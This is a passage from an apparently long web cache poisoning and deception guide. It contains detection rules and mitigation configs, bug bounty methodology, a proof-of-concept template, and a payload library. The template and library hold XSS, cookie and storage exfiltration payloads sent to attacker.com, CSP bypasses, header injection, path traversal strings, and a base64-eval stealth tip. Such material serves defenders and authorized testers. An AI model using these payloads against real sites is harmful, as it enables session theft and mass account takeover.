**Unusual Header Patterns:**
```bash
# Detect suspicious headers
grep -E "X-Forwarded-|X-Host|X-Original-URL" access.log

# Detect unusual User-Agent patterns
grep -E "User-Agent.*<script|User-Agent.*onerror" access.log
```

**Response Size Anomalies:**
```python
# Detect cached responses with unusual sizes
import re
from collections import defaultdict

cache_sizes = defaultdict(list)

with open('access.log') as f:
    for line in f:
        if 'X-Cache: HIT' in line:
            path = re.search(r'GET ([^ ]+)', line).group(1)
            size = re.search(r'(\d+)$', line).group(1)
            cache_sizes[path].append(int(size))

for path, sizes in cache_sizes.items():
    avg_size = sum(sizes) / len(sizes)
    for size in sizes:
        if abs(size - avg_size) > avg_size * 0.5:  # 50% deviation
            print(f"[!] Anomaly in {path}: {size} bytes (avg: {avg_size})")
```

### WAF Rules

**ModSecurity Rules:**
```apache
# Block suspicious cache-affecting headers
SecRule REQUEST_HEADERS:X-Forwarded-Host "@rx <script|javascript:|onerror" \
    "id:1001,phase:1,deny,status:403,msg:'Suspected cache poisoning attempt'"

# Block path traversal in static extensions
SecRule REQUEST_URI "@rx \.(css|js|jpg|png).*(\.\.|%2e%2e|%5c)" \
    "id:1002,phase:1,deny,status:403,msg:'Cache deception attempt'"

# Detect unusual cache busting patterns
SecRule REQUEST_URI "@rx \?.*=[^&]{100,}" \
    "id:1003,phase:1,deny,status:403,msg:'Unusual cache parameter'"

# Block method override headers from untrusted sources
SecRule REQUEST_HEADERS:X-HTTP-Method-Override "@rx (PUT|DELETE|PATCH)" \
    "id:1004,phase:1,deny,status:403,msg:'Method override blocked'"
```

**Cloudflare Workers Detection:**
```javascript
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const suspiciousHeaders = [
    'x-forwarded-host',
    'x-original-url',
    'x-rewrite-url'
  ]
  
  for (const header of suspiciousHeaders) {
    if (request.headers.has(header)) {
      const value = request.headers.get(header)
      if (/<script|javascript:|onerror/i.test(value)) {
        return new Response('Blocked: Suspicious header detected', {
          status: 403
        })
      }
    }
  }
  
  // Check for cache deception patterns
  const url = new URL(request.url)
  if (/\.(css|js|jpg|png).*(\.\.|%2e%2e)/i.test(url.pathname)) {
    return new Response('Blocked: Cache deception attempt', {
      status: 403
    })
  }
  
  return fetch(request)
}
```

### SIEM Queries

**Splunk:**
```spl
# Detect cache poisoning attempts
index=web_logs
| where like(request_headers, "%X-Forwarded-Host%")
| where like(request_headers, "%<script%") OR like(request_headers, "%javascript:%")
| stats count by src_ip, request_uri, request_headers
| where count > 5

# Detect cache deception patterns
index=web_logs status=200
| rex field=request_uri "(?<path>.*?)\.(?<ext>css|js|jpg|png)"
| where like(path, "%profile%") OR like(path, "%account%") OR like(path, "%admin%")
| stats count by src_ip, request_uri, response_content_type
| where response_content_type="text/html"
```

**ELK Stack:**
```json
{
  "query": {
    "bool": {
      "must": [
        {
          "query_string": {
            "query": "request.headers.x-forwarded-host:*<script* OR request.headers.user-agent:*<script*"
          }
        },
        {
          "range": {
            "@timestamp": {
              "gte": "now-1h"
            }
          }
        }
      ]
    }
  },
  "aggs": {
    "by_ip": {
      "terms": {
        "field": "source.ip",
        "size": 100
      }
    }
  }
}
```

---

## Mitigations

### Application-Level Defenses

**1. Strict Cache-Control Headers**

For sensitive/dynamic content:
```http
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache
Expires: 0
```

For authenticated pages:
```http
Cache-Control: private, no-cache, no-store, must-revalidate, max-age=0
Vary: Cookie, Authorization
```

**2. Input Validation and Sanitization**

```python
# Python/Flask example
from flask import request, abort
import re

ALLOWED_HEADERS = ['User-Agent', 'Accept', 'Accept-Language', 'Accept-Encoding']

@app.before_request
def validate_headers():
    for header, value in request.headers:
        # Block dangerous headers
        if header.lower().startswith('x-forwarded-') or \
           header.lower().startswith('x-original-') or \
           header.lower().startswith('x-rewrite-'):
            if '<' in value or '>' in value or 'javascript:' in value:
                abort(403)
        
        # Validate header format
        if not re.match(r'^[\x20-\x7E]+$', value):
            abort(400)
```

**3. URL Normalization**

```javascript
// Node.js/Express example
const path = require('path');

app.use((req, res, next) => {
  // Normalize path
  const normalized = path.normalize(req.path);
  
  // Block path traversal
  if (normalized.includes('..') || normalized !== req.path) {
    return res.status(400).send('Invalid path');
  }
  
  // Remove trailing static extensions from dynamic paths
  const sensitivePatterns = ['/profile', '/account', '/admin', '/api'];
  const staticExtensions = /\.(css|js|jpg|png|gif|ico|woff|svg)$/i;
  
  for (const pattern of sensitivePatterns) {
    if (req.path.startsWith(pattern) && staticExtensions.test(req.path)) {
      return res.status(404).send('Not Found');
    }
  }
  
  next();
});
```

**4. Disable Untrusted Headers**

```apache
# Apache configuration
RequestHeader unset X-Forwarded-Host
RequestHeader unset X-Forwarded-Server
RequestHeader unset X-Original-URL
RequestHeader unset X-Rewrite-URL
RequestHeader unset X-HTTP-Method-Override
```

```nginx
# Nginx configuration
proxy_set_header X-Forwarded-Host $host;
proxy_set_header X-Real-IP $remote_addr;

# Remove dangerous headers
proxy_set_header X-Original-URL "";
proxy_set_header X-Rewrite-URL "";
proxy_set_header X-HTTP-Method-Override "";
```

**5. Implement Content-Type Validation**

```python
# Ensure cached content matches expected type
def validate_cache_response(path, content_type):
    extension = path.split('.')[-1].lower()
    
    expected_types = {
        'css': 'text/css',
        'js': 'application/javascript',
        'jpg': 'image/jpeg',
        'png': 'image/png',
        'json': 'application/json'
    }
    
    expected = expected_types.get(extension)
    if expected and content_type != expected:
        # Don't cache mismatched content types
        return False
    return True
```

**6. Authentication State in Cache Key**

```javascript
// Vary cache based on authentication
app.use((req, res, next) => {
  if (req.isAuthenticated()) {
    res.set('Vary', 'Cookie, Authorization');
    res.set('Cache-Control', 'private, no-store');
  }
  next();
});
```

### CDN/Proxy Configuration

**1. Cloudflare Cache Rules**

```javascript
// Page Rule: Do not cache authenticated content
if (http.cookie contains "session=" or http.cookie contains "auth=") {
  Cache Level: Bypass
}

// Page Rule: Cache only known static paths
if (http.request.uri.path matches "^/(static|assets|media)/.*\.(css|js|jpg|png|gif|ico|woff|woff2|ttf|svg)$") {
  Cache Level: Cache Everything
  Edge Cache TTL: 1 month
} else {
  Cache Level: Bypass
}

// Transform Rule: Remove dangerous headers
remove(http.request.headers["x-forwarded-host"])
remove(http.request.headers["x-original-url"])
remove(http.request.headers["x-rewrite-url"])
```

**2. Varnish VCL Configuration**

```vcl
sub vcl_recv {
    # Remove dangerous headers
    unset req.http.X-Forwarded-Host;
    unset req.http.X-Original-URL;
    unset req.http.X-Rewrite-URL;
    unset req.http.X-HTTP-Method-Override;
    
    # Don't cache authenticated requests
    if (req.http.Cookie ~ "session=|auth=") {
        return (pass);
    }
    
    # Only cache specific paths
    if (req.url !~ "^/(static|assets|media)/") {
        return (pass);
    }
    
    # Validate static file extensions
    if (req.url ~ "\.(css|js|jpg|png|gif|ico|woff|woff2)$") {
        # Ensure path doesn't contain traversal
        if (req.url ~ "\.\.") {
            return (synth(400, "Bad Request"));
        }
        return (hash);
    }
    
    return (pass);
}

sub vcl_backend_response {
    # Don't cache if wrong content-type for extension
    if (bereq.url ~ "\.css$" && beresp.http.Content-Type !~ "text/css") {
        set beresp.ttl = 0s;
        set beresp.uncacheable = true;
        return (deliver);
    }
    
    if (bereq.url ~ "\.js$" && beresp.http.Content-Type !~ "javascript") {
        set beresp.ttl = 0s;
        set beresp.uncacheable = true;
        return (deliver);
    }
}
```

**3. AWS CloudFront Configuration**

```json
{
  "CacheBehaviors": [
    {
      "PathPattern": "/static/*",
      "TargetOriginId": "S3-static-origin",
      "ViewerProtocolPolicy": "https-only",
      "AllowedMethods": ["GET", "HEAD"],
      "CachedMethods": ["GET", "HEAD"],
      "Compress": true,
      "ForwardedValues": {
        "QueryString": false,
        "Headers": [],
        "Cookies": {
          "Forward": "none"
        }
      },
      "MinTTL": 86400,
      "DefaultTTL": 2592000,
      "MaxTTL": 31536000
    },
    {
      "PathPattern": "/*",
      "TargetOriginId": "app-origin",
      "ViewerProtocolPolicy": "https-only",
      "AllowedMethods": ["GET", "HEAD", "OPTIONS", "PUT", "POST", "PATCH", "DELETE"],
      "CachedMethods": ["GET", "HEAD"],
      "ForwardedValues": {
        "QueryString": true,
        "Headers": ["Host", "User-Agent", "Accept", "Accept-Language"],
        "Cookies": {
          "Forward": "all"
        }
      },
      "MinTTL": 0,
      "DefaultTTL": 0,
      "MaxTTL": 0
    }
  ]
}
```

### Security Headers

**Complete Security Header Set:**

```http
# Prevent caching of sensitive content
Cache-Control: no-store, no-cache, must-revalidate, private, max-age=0
Pragma: no-cache
Expires: 0

# Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'nonce-{random}'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'

# Prevent MIME sniffing
X-Content-Type-Options: nosniff

# XSS Protection
X-XSS-Protection: 1; mode=block

# Frame Options
X-Frame-Options: DENY

# HSTS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Referrer Policy
Referrer-Policy: strict-origin-when-cross-origin

# Permissions Policy
Permissions-Policy: geolocation=(), microphone=(), camera=()

# Clear-Site-Data on logout
Clear-Site-Data: "cache", "cookies", "storage"
```

### Cookie Security

**Secure Cookie Attributes:**

```http
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
Set-Cookie: auth=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Domain=.example.com
```

**Cookie Validation:**

```python
# Python example
def validate_cookie_security(response):
    cookies = response.headers.get('Set-Cookie', '')
    
    required_flags = ['Secure', 'HttpOnly', 'SameSite']
    for flag in required_flags:
        if flag not in cookies:
            raise SecurityError(f"Missing {flag} flag in cookie")
    
    # Ensure short session timeouts
    if 'Max-Age' in cookies:
        max_age = int(re.search(r'Max-Age=(\d+)', cookies).group(1))
        if max_age > 3600:  # 1 hour
            raise SecurityError("Session timeout too long")
```

### Response Validation

**Server-Side Response Checks:**

```python
class CacheSecurityMiddleware:
    def process_response(self, request, response):
        # Don't cache if contains sensitive markers
        sensitive_markers = [
            'csrf_token', 'authenticity_token',
            'api_key', 'access_token',
            'password', 'ssn', 'credit_card'
        ]
        
        content = response.content.decode('utf-8', errors='ignore').lower()
        if any(marker in content for marker in sensitive_markers):
            response['Cache-Control'] = 'no-store, private'
            response['Pragma'] = 'no-cache'
            response['Expires'] = '0'
        
        # Validate content-type matches extension
        path = request.path
        content_type = response.get('Content-Type', '')
        
        if path.endswith('.css') and 'text/css' not in content_type:
            return HttpResponse('Content-Type mismatch', status=400)
        
        if path.endswith('.js') and 'javascript' not in content_type:
            return HttpResponse('Content-Type mismatch', status=400)
        
        return response
```

### Monitoring and Alerting

**Detection Rules:**

```yaml
# SIEM Alert Configuration
alerts:
  - name: "Cache Poisoning Attempt"
    condition: |
      (request.headers contains "X-Forwarded-Host" 
       OR request.headers contains "X-Original-URL")
      AND (request.headers contains "<script" 
       OR request.headers contains "javascript:")
    severity: HIGH
    action: block_and_alert
    
  - name: "Cache Deception Attempt"
    condition: |
      request.path matches "/(profile|account|admin|api)/.*\.(css|js|jpg|png)$"
      AND response.content_type == "text/html"
      AND response.status == 200
    severity: HIGH
    action: alert
    
  - name: "Unusual Cache Hit Ratio"
    condition: |
      cache.hit_ratio < 0.4
      AND request.count > 1000
      AND time_window == "5m"
    severity: MEDIUM
    action: alert
```

### Secure Development Practices

**Code Review Checklist:**

- [ ] All sensitive endpoints have `Cache-Control: no-store`
- [ ] No untrusted headers reflected in responses
- [ ] URL normalization prevents path traversal
- [ ] Content-Type validated against file extension
- [ ] Authentication state included in Vary header
- [ ] Cookies have Secure, HttpOnly, SameSite flags
- [ ] CSP blocks inline scripts from reflected headers
- [ ] Static resources served from separate domain/subdomain
- [ ] Cache keys include all security-relevant parameters
- [ ] Regular security testing includes cache poisoning scenarios

---

## Vulnerable Software/Configurations

### Known Vulnerable Scenarios

**Apache Traffic Server (CVE-2021-27577)**
- Forwards URL fragments without stripping
- Cache key ignores fragments
- `/#/../?r=payload` bypasses sanitization

**Ruby on Rails with Rack Middleware**
- Honors `x-forwarded-scheme` header
- Can trigger redirect loops
- `x-forwarded-scheme: http` causes 301 to cached page

**GitHub (2018)**
- Fat GET body parameter prioritized over URL
- Cache used URL parameter as key
- Victim parameter in body affected other users

**GitLab + GCP Buckets**
- Supported `x-http-method-override: HEAD`
- Cached empty responses
- DoS via empty body caching

**Cloudflare (Historical)**
- Cached 403 responses
- S3/Azure auth failures cached
- Public access to private bucket errors

**Fastly/Varnish**
- Keyed on `size` parameter
- URL-encoded `siz%65` parameter ignored by cache
- Backend used encoded version

**Akamai**
- Forwards headers with illegal characters (`\`)
- Caches resulting 400 errors
- DoS via illegal header characters

### Framework-Specific Issues

**WordPress**
- `/wp-content/` always cached
- Path traversal: `/wp-content/../wp-admin/`
- Admin pages served from cache

**Django**
- Default cache middleware keys on path + query
- Headers not included unless explicitly configured
- `X-Forwarded-Host` commonly reflected

**Express.js**
- Trust proxy setting affects header parsing
- Misconfigured proxies allow header injection
- No default cache validation

**Spring Boot**
- Matrix variables allow `;` delimiter
- `/path;param=value` bypasses filters
- Static resource handler vulnerable

---

## References and Further Reading

### Primary Resources

- [RFC7234 - HTTP/1.1 Caching](https://tools.ietf.org/html/rfc7234)
- [RFC7231 - HTTP/1.1 Semantics](https://tools.ietf.org/html/rfc7231#section-4.2.3)
- [MDN - HTTP Caching](https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching)
- [MDN - Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)

### Research Papers and Presentations

- [PortSwigger: Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [PortSwigger: Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [PortSwigger: Gotta Cache 'Em All](https://portswigger.net/research/gotta-cache-em-all)
- [Black Hat: Web Cache Deception Attack](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

### Writeups and Case Studies

- [Sam Curry: Rocket League Account Takeover](https://samcurry.net/abusing-http-path-normalization-and-cache-poisoning-to-steal-rocket-league-accounts/)
- [Cache Poisoning and Other Dirty Tricks](https://lab.wallarm.com/cache-poisoning-and-other-dirty-tricks-120468f1053f/)
- [ChatGPT Account Takeover via Cache Deception](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)
- [Apple Hall of Fame: Unauth Cache Purging](https://sapt.medium.com/apple-hall-of-fame-for-a-small-misconfiguration-unauth-cache-purging-faf81b19419b)
- [Cache Deception + CSPT Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [Zendesk Mass Compromise](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [Bxmbn: Web Cache Vulnerability Testing Tips](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [Anas Betis: Cache Poisoning and Deception Vulnerabilities](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
- [Youst: Cache Poisoning at Scale](https://youst.in/posts/cache-poisoning-at-scale/)
- [Hesar101: 0-Click Account Takeover via Cache](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [watchTowr Labs: Sitecore Cache Poisoning to RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)

### Security Testing Resources

- [PortSwigger Web Security Academy - Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Web Security Academy - Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [OWASP Testing Guide - Cache Poisoning](https://owasp.org/www-project-web-security-testing-guide/)
- [HackerOne Reports - Cache Vulnerabilities](https://hackerone.com/reports/593712)
- [HackerOne Reports - Cache Purge Unauth](https://hackerone.com/reports/154278)

### Tools and Projects

- [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)
- [Param Miner (Burp Extension)](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)
- [Web Cache Deception Scanner (Burp)](https://github.com/PortSwigger/web-cache-deception-scanner)
- [Toxicache](https://github.com/xhzeem/toxicache)
- [FockCache](https://github.com/tismayil/fockcache)
- [Arjun - Parameter Discovery](https://github.com/s0md3v/Arjun)
- [ParamSpider](https://github.com/devanshbatham/ParamSpider)
- [Parth - Path Discovery](https://github.com/s0md3v/Parth)
- [Parameth](https://github.com/maK-/parameth)

### Community Resources

- [CSPT Overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT Presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [BruteLogic: XSS via HTTP Headers](https://brutelogic.com.br/blog/xss-via-http-headers/)
- [New Cache Headers Discovery Gist](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

---

## Bug Bounty Tips

### Reconnaissance Phase

**1. Identify Cache Infrastructure**

```bash
# Check for cache headers
curl -I https://target.com | grep -i cache

# Common cache indicators
X-Cache: hit
X-Cache: miss
CF-Cache-Status: HIT
Age: 3600
Via: 1.1 varnish
X-Varnish: 123456
X-Served-By: cache-server
Akamai-Cache-Status: Hit
X-Cache-Hits: 1
```

**2. Map Application Architecture**

- Identify CDN provider (Cloudflare, Akamai, Fastly, CloudFront)
- Find static resource directories (`/static`, `/assets`, `/media`)
- Locate sensitive endpoints (`/profile`, `/account`, `/api`)
- Document authentication mechanisms
- Note framework/technology stack

**3. Enumerate Parameters and Headers**

```bash
# Automated parameter discovery
arjun -u https://target.com/api/endpoint --get -t 10
paramspider --domain target.com
python3 parth.py -t target.com

# Header fuzzing
ffuf -u https://target.com -w headers.txt:HEADER -H "HEADER: test"
```

### Testing Methodology

**Phase 1: Quick Wins (15 minutes)**

```bash
# Test basic cache deception
curl https://target.com/profile/test.css
curl https://target.com/account.js
curl https://target.com/api/user.png

# Test basic poisoning
curl -H "X-Forwarded-Host: evil.com" https://target.com
curl -H "X-Forwarded-For: <script>alert(1)</script>" https://target.com

# Check for unauth cache purge
curl -X PURGE https://target.com/
```

**Phase 2: Deep Testing (1-2 hours)**

```bash
# Delimiter testing
/profile;.css
/profile%00.js
/profile%0a.png
/profile.css%23test

# Encoding variations
/profile%2e%2e/static/file.js
/profile..%2fstatic/file.css
/profile..%5cstatic/file.png

# Header combinations
X-Forwarded-Host + X-Forwarded-Scheme
X-Forwarded-Host + X-Original-URL
X-Host + X-HTTP-Method-Override

# Static directory abuse
/profile/../static/test.js
/home/..%2fstatic/file.css
/static/..%2fprofile
```

**Phase 3: Advanced Exploitation (2-4 hours)**

- Chain multiple unkeyed headers
- Test CSPT in JavaScript applications
- Attempt Fat GET attacks
- Test method override combinations
- Exploit framework-specific delimiters
- Target CDN-specific behaviors

### High-Value Targets

**1. Authentication Endpoints**

```
/login
/signin
/auth/callback
/oauth/callback
/api/auth/session
/api/auth/token
```

**2. User Profile Pages**

```
/profile
/account
/settings
/dashboard
/me
/user/info
```

**3. API Endpoints**

```
/api/user
/api/profile
/api/token
/graphql
/v1/user
/v2/account
```

**4. Admin Interfaces**

```
/admin
/administrator
/wp-admin
/admin-panel
/control-panel
```

### Impact Escalation

**From Low to Critical:**

1. **Basic Cache Deception** → Access single user's data
2. **Deception + Loop** → Access all users visiting page
3. **Poisoning with XSS** → Execute code in victims' browsers
4. **XSS + Cookie Theft** → Account takeover
5. **ATO + Admin Access** → Full application compromise

**Demonstrate Business Impact:**

- Calculate number of affected users
- Show PII/sensitive data exposure
- Prove account takeover capability
- Demonstrate financial loss potential
- Evidence GDPR/compliance violations

### Report Writing Tips

**Title Format:**
```
[Critical] Web Cache Poisoning Leading to Mass Account Takeover via XSS
[High] Web Cache Deception Exposing User Authentication Tokens
[Medium] Cache Poisoning Denial of Service via Header Injection
```

**Report Structure:**

1. **Summary**: One-sentence impact description
2. **Vulnerability Details**: Technical explanation
3. **Proof of Concept**: Step-by-step reproduction
4. **Impact**: Business consequences
5. **Affected Assets**: URLs and endpoints
6. **Remediation**: Specific fixes
7. **References**: Supporting documentation

**Proof of Concept Template:**

```markdown
## Reproduction Steps

1. Send the following request to poison the cache:
   ```http
   GET /popular-page HTTP/1.1
   Host: target.com
   X-Forwarded-Host: attacker.com"><script>fetch('https://attacker.com',{method:'POST',body:document.cookie})</script>
   ```

2. Verify the response is cached:
   ```http
   GET /popular-page HTTP/1.1
   Host: target.com
   ```
   
   Response headers show: `X-Cache: HIT`

3. Open incognito browser and visit: https://target.com/popular-page

4. Observer network traffic showing cookies exfiltrated to attacker.com

## Video Demonstration
[Attach screen recording]

## Impact
- 50,000+ daily visitors to /popular-page
- Each visitor's session cookie stolen
- Full account access for attacker
- Estimated 24-hour cache duration = 50,000 compromised accounts
```

### Bounty Optimization

**Timing Strategies:**

- Submit during business hours for faster response
- Test new features/launches immediately
- Focus on high-traffic pages for maximum impact
- Chain multiple vulnerabilities for higher severity

**Communication Tips:**

- Be professional and detailed
- Provide all reproduction steps
- Include screenshots/videos
- Suggest specific remediation
- Follow up appropriately (don't spam)

**Payout Expectations:**

- **Critical** (RCE, mass ATO): $5,000 - $50,000+
- **High** (single ATO, data breach): $1,000 - $10,000
- **Medium** (DoS, limited impact): $500 - $2,500
- **Low** (info disclosure): $100 - $500

---

## Testing Checklist

### Initial Assessment

- [ ] Identify cache infrastructure (CDN, proxy, server)
- [ ] Check for cache-related headers in responses
- [ ] Map application architecture and sensitive endpoints
- [ ] Identify authentication mechanisms
- [ ] Document static resource locations

### Cache Deception Testing

- [ ] Test basic extension appending (`.css`, `.js`, `.jpg`)
- [ ] Test delimiter variations (`;`, `%00`, `%0a`)
- [ ] Test path traversal to static directories
- [ ] Test path traversal to well-known files
- [ ] Verify Content-Type mismatches
- [ ] Confirm cache hit status
- [ ] Test access from different context (incognito)
- [ ] Check for sensitive data in cached response

### Cache Poisoning Testing

**Header Testing:**
- [ ] Test `X-Forwarded-Host` reflection
- [ ] Test `X-Forwarded-For` reflection
- [ ] Test `X-Forwarded-Scheme` manipulation
- [ ] Test `X-Original-URL` injection
- [ ] Test `X-Rewrite-URL` injection
- [ ] Test `X-HTTP-Method-Override` abuse
- [ ] Test `User-Agent` reflection
- [ ] Test custom/uncommon headers

**Parameter Testing:**
- [ ] Identify unkeyed GET parameters
- [ ] Identify unkeyed POST parameters
- [ ] Test parameter cloaking (`;` delimiter)
- [ ] Test Fat GET (body vs URL params)
- [ ] Test query string encoding variations

**Payload Testing:**
- [ ] Test XSS payloads in headers
- [ ] Test open redirect payloads
- [ ] Test JavaScript injection
- [ ] Test HTML injection
- [ ] Test CSS injection
- [ ] Test CRLF injection

**Cache Verification:**
- [ ] Confirm response is cached (check headers)
- [ ] Test cache retrieval from clean context
- [ ] Verify cache duration/TTL
- [ ] Check if cache varies on sensitive headers

### DoS Testing

- [ ] Test oversized headers
- [ ] Test illegal header characters
- [ ] Test unexpected Content-Type values
- [ ] Test method override to unsupported methods
- [ ] Test unkeyed port in Host header
- [ ] Test long redirect chains
- [ ] Test Host header case sensitivity

### Advanced Testing

- [ ] Test delimiter combinations
- [ ] Test encoding normalization issues
- [ ] Test dot-segment resolution
- [ ] Test CDN-specific behaviors
- [ ] Test framework-specific quirks
- [ ] Test CSPT in SPAs
- [ ] Test request smuggling integration
- [ ] Test multi-stage attack chains

### Validation and Impact

- [ ] Verify exploitation works consistently
- [ ] Test from multiple IP addresses/locations
- [ ] Measure cache duration
- [ ] Estimate affected user count
- [ ] Document sensitive data exposure
- [ ] Prove account takeover capability
- [ ] Calculate business impact

---

## Payload Library

### Basic XSS Payloads

```html
"><script>alert(document.domain)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(document.cookie)
```

### Cookie Exfiltration

```javascript
<script>new Image().src='https://attacker.com/log?c='+document.cookie</script>
<script>fetch('https://attacker.com/log',{method:'POST',body:document.cookie})</script>
<script>navigator.sendBeacon('https://attacker.com/log',document.cookie)</script>
```

### Advanced Exfiltration

```javascript
<script>
fetch('https://attacker.com/exfil',{
  method:'POST',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:Object.entries(localStorage),
    sessionStorage:Object.entries(sessionStorage),
    origin:location.origin,
    userAgent:navigator.userAgent
  })
});
</script>
```

### DOM-Based Payloads

```javascript
<script>location='https://attacker.com/phish?ref='+encodeURIComponent(document.referrer)</script>
<script>window.name=document.cookie;location='https://attacker.com'</script>
```

### CSP Bypass Techniques

```html
<!-- If 'unsafe-inline' allowed -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- If external scripts allowed from specific domain -->
<script src="https://allowed-domain.com/evil.js"></script>

<!-- Using data URIs if allowed -->
<script src="data:text/javascript,alert(1)"></script>

<!-- JSONP endpoint abuse -->
<script src="https://target.com/jsonp?callback=alert"></script>
```

### Header Injection Payloads

```
X-Forwarded-Host: attacker.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>
X-Forwarded-Host: javascript:alert(1)//
X-Forwarded-For: <script>alert(1)</script>
User-Agent: Mozilla/5.0</script><script>alert(1)</script>
```

### Path Traversal Payloads

```
/profile/../../static/file.css
/profile%2f..%2f..%2fstatic%2ffile.js
/profile/..;/..;/static/file.png
/profile%00/../static/file.jpg
/profile%0a/../static/file.woff
```

### Open Redirect Payloads

```
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
Location: //evil.com
Location: ///evil.com
Location: \/\/evil.com
```

---

## Common Mistakes and Pitfalls

### Testing Mistakes

**1. Not Checking Cache Status**
- Always verify `X-Cache`, `CF-Cache-Status`, or similar headers
- Don't assume caching without confirmation

**2. Testing with Same Session**
- Use incognito/private browsing for verification
- Test from different IP addresses
- Clear cookies between tests

**3. Ignoring Cache Duration**
- Wait for cache TTL to expire before retesting
- Use unique cache busters: `?cb=timestamp`
- Some caches have very long TTLs (hours/days)

**4. Overlooking Vary Header**
- Check if `Vary` includes `Cookie`, `Authorization`
- Your payload may only affect specific user agents
- Test with matching Vary conditions

**5. Testing Production Carelessly**
- Don't poison production caches with actual exploits
- Use proof-of-concept payloads only
- Consider cache impact on real users

### Exploitation Mistakes

**1. Using Obvious Payloads**
```javascript
// Bad - easily detected
<script>alert('XSS')</script>

// Better - stealthier
<script>/**/eval(atob('base64payload'))</script>
```

**2. Not Encoding Properly**
```
// May break due to special chars
X-Forwarded-Host: test"><script>alert(1)</script>

// Better
X-Forwarded-Host: test%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```

**3. Ignoring Content-Type**
- `.css` paths expecting `text/css`
- `.js` paths expecting `application/javascript`
- Mismatch may prevent caching

### Report Mistakes

**1. Weak Impact Demonstration**
```
// Bad
"I can inject JavaScript into the page"

// Good
"I can steal session cookies from all 50,000 daily visitors to the homepage,
leading to mass account takeover. Attached video shows 5 different victims'
accounts compromised using this technique."
```

**2. Incomplete Reproduction Steps**
```
// Bad
"Send X-Forwarded-Host header with XSS payload"

// Good
"1. Send this exact request: [full HTTP request]
2. Wait 30 seconds for cache propagation
3. Access URL from incognito: [exact URL]
4. Observe payload execution: [screenshot]"
```

**3. Missing Business Context**
```
// Bad
"Cache poisoning vulnerability found"

// Good
"This vulnerability allows attackers to execute JavaScript in any user's
browser when they visit the homepage. With 50K daily visitors and a 6-hour
cache duration, approximately 12,500 users could be compromised per attack.
Session cookies are not HttpOnly, enabling immediate account takeover."
```

---

## Future Trends and Emerging Techniques

### HTTP/3 and QUIC Caching

**New Considerations:**
- Connection-level caching with 0-RTT
- Push promise cache interactions
- Alt-Svc header implications
- Different header handling

### Edge Computing and Serverless

**Attack Surface Changes:**
- Cloudflare Workers cache API
- AWS Lambda@Edge
- Fastly Compute@Edge
- Increased client-side cache control

### AI/ML-Powered WAFs

**Bypass Strategies:**
- Polymorphic payload generation
- Timing-based cache seeding
- Low-and-slow poisoning techniques
- Behavior-based evasion

### GraphQL Caching

**New Vectors:**
- Query-based cache keys
- Alias manipulation
- Fragment caching
- Introspection abuse

### WebAssembly Caching

**Emerging Risks:**
- WASM module poisoning
- Binary-level cache manipulation
- Cross-origin WASM loading

---

## Conclusion

Web Cache Poisoning and Deception represent critical vulnerabilities that can lead to mass compromise of web applications. Understanding caching mechanisms, identifying unkeyed inputs, and properly validating cached content are essential for both attackers (security researchers) and defenders.

**Key Takeaways:**

✅ **Always verify cache behavior** - Don't assume, confirm with headers
✅ **Test from clean contexts** - Use incognito/different IPs
✅ **Focus on high-impact endpoints** - Auth, profile, API endpoints
✅ **Chain techniques** - Combine multiple weaknesses for maximum impact
✅ **Document thoroughly** - Clear reproduction steps and business impact
✅ **Defend in depth** - Multiple layers of protection are essential

**Remember:** With authorization comes responsibility. These techniques should only be used for legitimate security testing with proper permission. Unauthorized testing can cause service disruption and legal consequences.
